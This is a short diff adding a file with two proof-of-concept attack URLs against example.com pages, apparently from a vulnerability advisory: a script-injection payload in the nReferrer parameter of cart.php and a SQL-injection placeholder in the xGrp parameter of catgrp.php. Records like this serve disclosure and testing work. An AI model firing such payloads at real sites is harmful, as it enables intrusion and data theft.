@@ -1,0 +1,3 @@
+http://www.example.com/cart.php?nReferrer=';</script><script>alert(XSS)</script>
+
+http://www.example.com/catgrp.php?xGrp=[SQLi]
